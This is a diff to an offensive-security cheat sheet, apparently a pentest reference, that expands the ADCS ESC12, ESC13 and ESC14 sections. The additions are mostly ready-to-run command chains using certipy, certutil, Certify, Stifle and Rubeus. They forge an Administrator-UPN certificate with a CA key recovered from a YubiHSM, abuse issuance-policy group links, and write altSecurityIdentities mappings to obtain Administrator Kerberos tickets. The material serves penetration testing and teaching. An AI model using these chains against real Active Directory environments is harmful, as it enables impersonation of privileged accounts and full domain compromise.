@@ -395,23 +395,59 @@ Exploitation:
 
 ## ESC12 - ADCS CA on YubiHSM
 
-The ESC12 vulnerability occurs when a Certificate Authority (CA) stores its private key on a YubiHSM2 device, which requires an authentication key (password) to access. This password is stored in the registry in cleartext, allowing an attacker with shell access to the CA server to recover the private key.
+> The ESC12 vulnerability occurs when a Certificate Authority (CA) stores its private key on a YubiHSM2 device, which requires an authentication key (password) to access. This password is stored in the registry in cleartext, allowing an attacker with shell access to the CA server to recover the private key.
 
-Unlocking the YubiHSM with the plaintext password in the registry key: `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`.
+**Requirements**:
+
+* CA certificate
+* Shell access on the root CA server
+
+**Exploitation**:
+
+* Generate a certicate for the user
+
+  ```ps1
+  certipy req -target dc-esc.esc.local -dc-ip 10.10.10.10 -u "user_esc12@esc.local" -p 'P@ssw0rd' -template User -ca <CA-Common-Name>
+  certipy cert -pfx user_esc12.pfx -nokey -out user_esc12.crt
+  certipy cert -pfx user_esc12.pfx -nocert -out user_esc12.key
+  ```
 
 * Importing the CA certificate into the user store
 
   ```ps1
-  certutil -addstore -user my <CA certificate file>
+  certutil -addstore -user my .\Root-CA-5.cer
   ```
 
 * Associated with the private key in the YubiHSM2 device
 
   ```ps1
-  certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
+  certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA-Common-Name>
   ```
 
-* Finally use `certutil -sign ...`
+* Sign `user_esc12.crt` and specify a `Subject Alternative Name` using the `extension.inf` file.
+
+  ```
+  certutil -sign ./user_esc12.crt new.crt @extension.inf
+  ```
+
+* Content of extension.inf
+
+  ```cs
+  [Extensions]
+  2.5.29.17 = "{text}"
+  _continue_ = "UPN=Administrator@esc.local&"
+  ```
+
+
+* Use the certificate to get the TGT of the Administrator
+
+  ```ps1
+  openssl.exe pkcs12 -export -in new.crt -inkey user_esc12.key -out user_esc12_Administrator.pfx
+  Rubeus.exe asktgt /user:Administrator /certificate:user_esc12_Administrator.pfx /domain:esc.local /dc:192.168.1.2 /show /nowrap
+  ```
+
+Unlocking the YubiHSM with the plaintext password in the registry key: `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`.
+
 
 ## ESC13 - Issuance Policy
 
@@ -444,35 +480,108 @@ Members           : {}
 
 **Exploitation**:
 
+* Find a vulnerable template
+
+  ```ps1
+  certipy find -target dc.lab.local -dc-ip 10.10.10.10 -u "username" -p "P@ssw0rd" -stdout -vulnerable
+  ```
+
 * Request a certificate for the vulnerable template
 
   ```ps1
-  PS C:\> .\Certify.exe request /ca:DC01\dumpster-DC01-CA /template:ESC13Template
+  .\Certify.exe request /ca:DC01\dumpster-DC01-CA /template:ESC13Template
+  certipy req -target dc.lab.local -dc-ip 10.10.10.10 -u "username" -p "P@ssw0rd" -template <ESC13-Template> -ca <CA-NAME>
   ```
 
 * Merge into a PFX file
 
   ```ps1
-  PS C:\> certutil -MergePFX .\esc13.pem .\esc13.pfx
+  certutil -MergePFX .\esc13.pem .\esc13.pfx
   ```
 
 * Verify the presence of the "Client Authentication" and the "Policy Identifier"
 
   ```ps1
-  PS C:\> certutil -Dump -v .\esc13.pfx
+  certutil -Dump -v .\esc13.pfx
   ```
 
-* Ask a TGT for our user, but we are also member of the linked group and inherited their privileges
+* Pass-The-Certificate: Ask a TGT for our user, but we are also member of the linked group and inherited their privileges
 
   ```ps1
-  PS C:\> .\Rubeus.exe asktgt /user:ESC13User /certificate:C:\esc13.pfx /nowrap
+  Rubeus.exe asktgt /user:ESC13User /certificate:C:\esc13.pfx /nowrap
+  Rubeus.exe asktgt /user:username /certificate:username.pfx /domain:lab.local /dc:dc /nowrap
   ```
+
+* Pass-The-Ticket: Use the ticket that grant privileges from the AD group
+
+  ```ps1
+  Rubeus.exe ptt /ticket:<ticket>
+  ```
+
+
+## ESC14 - altSecurityIdentities
+
+> ESC14 is an Active Directory Certificate Services (ADCS) abuse technique that leverages the altSecurityIdentities attribute to perform explicit certificate mappings. This attribute allows administrators to associate specific certificates with user or computer accounts for authentication purposes. However, if an attacker gains write access to this attribute, they can add a mapping to a certificate they control, effectively impersonating the targeted account.
+
+Domain administrators can manually associate certificates with a user in Active Directory by configuring the altSecurityIdentities attribute of the user object. This attribute supports six different values, categorized into three weak (insecure) mappings and three strong mappings.
+
+In general, a mapping is considered strong if it relies on unique, non-reusable identifiers. Conversely, mappings based on usernames or email addresses are classified as weak, as these identifiers can be easily reused or changed.
+
+| Mapping                | Example                            | Type   | Remarks       |
+| ---------------------- | ---------------------------------- | ------ | ------------- |
+| X509IssuerSubject      | `X509:<I>IssuerName<S>SubjectName` | Weak   | /             |
+| X509SubjectOnly        | `X509:<S>SubjectName`              | Weak   | /             |
+| X509RFC822             | `X509:<RFC822>user@contoso.com`    | Weak   | Email Address |
+| X509IssuerSerialNumber | `X509:<I>IssuerName<SR>1234567890` | Strong | Recommended   |
+| X509SKI                | `X509:<SKI>123456789abcdef`        | Strong | /             |
+| X509SHA1PublicKey      | `X509:<SHA1-PUKEY>123456789abcdef` | Strong | /             |
+
+**Requirements**:
+
+* Ability to modify the attribute `altSecurityIdentitites` of an account.
+
+**Exploitation**:
+
+**Technique 1** with [GhostPack/Certify](https://github.com/GhostPack/Certify) and [logangoins/Stifle](https://github.com/logangoins/Stifle)
+
+```ps1
+# the certificate requested must be a machine account certificate
+Certify.exe request /ca:lab.lan\lab-dc01-ca /template:Machine /machine
+
+# convert to base64 .pfx format:
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export | base64 -w 0
+
+# generate a certificate mapping string and write it to the target objects altSecurityIdentities attribute:
+Stifle.exe add /object:target /certificate:MIIMrQI... /password:P@ssw0rd
+
+# request a TGT using PKINIT authentication, effectively impersonating the target user with Rubeus:
+Rubeus.exe asktgt /user:target /certificate:MIIMrQI... /password:P@ssw0rd
+```
+
+**Technique 2** using [Deloitte-OffSecResearch/Certipy](https://github.com/Deloitte-OffSecResearch/Certipy) and [JonasBK/Add-AltSecIDMapping.ps1](https://github.com/JonasBK/Powershell/blob/master/Add-AltSecIDMapping.ps1)
+
+```ps1
+# request a machine account certificate
+addcomputer.py -method LDAPS -computer-name 'ESC13$' -computer-pass 'P@ssw0rd' -dc-host dc.lab.local 'lab.local/kuma'
+certipy req -target dc.lab.local -dc-ip 10.10.10.10 -u "ESC13$@lab.local" -p 'P@ssw0rd' -template Machine -ca LAB-CA
+
+# extract Serial Number and Issuer, to configure a strong mapping
+certutil -Dump -v .\esc13.pfx
+Get-X509IssuerSerialNumberFormat -SerialNumber "<serial-number>" -IssuerDistinguishedName "<issuer-cn>"
+
+# add mapping to the Administrator user
+Add-AltSecIDMapping -DistinguishedName "CN=Administrator,CN=Users,DC=lab,DC=local" -MappingString "<output-x509-issuer-serial-number>"
+
+# request TGT for Administrator
+Rubeus.exe asktgt /user:Administrator /certificate:esc13.pfx /domain:lab.local /dc:dc.lab.local /show /nowrap
+```
+
 
 ## ESC15 - EKUwu Application Policies - CVE-2024-49019
 
 This technique now has a CVE number and was patched on November 12, See [Active Directory Certificate Services Elevation of Privilege Vulnerability - CVE-2024-49019](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019) for more information.
 
-**Requirements**
+**Requirements**:
 
 * **Template Schema** Version 1
 * **ENROLLEE_SUPPLIES_SUBJECT** = `True`
@@ -688,3 +797,6 @@ Using the **UnPAC The Hash** method, you can retrieve the NT Hash for an User vi
 * [ESC15/EKUwu PR #228 - dru1d-foofus - 10/08/2024](https://github.com/ly4k/Certipy/pull/228)
 * [EKUwu: Not just another AD CS ESC - Justin Bollinger - October 08, 2024](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
 * [ADCS Exploitation Part 2: Certificate Mapping + ESC15 - Giulio Pierantoni - Oct 10, 2024](https://medium.com/@offsecdeer/adcs-exploitation-series-part-2-certificate-mapping-esc15-6e19a6037760)
+* [ADCS ESC14 Abuse Technique - Jonas Bülow Knudsen - February 28, 2024](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9)
+* [Exploitation de l’AD CS : ESC12, ESC13 et ESC14 - Guillon Bony Rémi - February, 2025](https://connect.ed-diamond.com/misc/mischs-031/exploitation-de-l-ad-cs-esc12-esc13-et-esc14)
+* [Curious case of AD CS ESC15 vulnerable instance and its manual exploitation - Mannu Linux - February 13, 2025](https://www.mannulinux.org/2025/02/Curious-case-of-AD-CS-ESC15-vulnerable-instance-and-its-manual-exploitation.html)
